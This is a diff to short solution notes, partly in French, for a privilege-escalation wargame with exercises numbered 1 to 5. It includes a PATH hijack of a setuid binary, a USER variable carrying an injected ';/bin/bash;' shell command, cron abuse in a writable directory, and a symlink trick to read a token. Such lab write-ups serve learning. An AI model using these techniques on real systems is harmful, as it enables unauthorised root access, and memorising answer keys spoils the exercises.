@@ -20,15 +20,17 @@ export PATH=/tmp:$PATH
 # Now run the program
 /home/flag01/flag01
 ```
+
 ## Exercice 2
 Modify the USER environment variable
 `export $USER=";/bin/bash;"`
 
 ## Exercice 3
 Cron exécute en root les scripts dans `writable.d`, effectuer `getflag > /tmp/flag.txt; chmod 777 /tmp/flag.txt`
+
 ## Exercice 4
 Depuis level04, créer un symlink `ln -s ../flag04/token my_symlink`
-puis lancer avec `../flag04/flag04 symlink`
+puis lancer avec `../flag04/flag04 my_symlink`
 
 ## Exercice 5
 Copier puis décompresser (`tar -xvzf`) la backup et utiliser
